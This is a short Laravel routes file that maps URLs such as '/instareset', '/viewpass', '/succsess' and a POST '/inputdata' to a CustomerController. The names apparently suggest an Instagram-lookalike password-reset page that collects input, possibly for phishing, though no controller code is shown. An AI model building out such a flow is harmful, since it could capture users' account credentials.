<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\CustomerController;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::get('/', function () {
    return view('welcome');
});

Route::get('/instareset', [CustomerController::class, 'index'])->name('instareset');
Route::get('/viewpass', [CustomerController::class, 'instareset'])->name('instaview');
Route::get('/succsess', [CustomerController::class, 'succsess'])->name('succsess');
Route::post('/inputdata', [CustomerController::class, 'inputdata'])->name('inputdata');

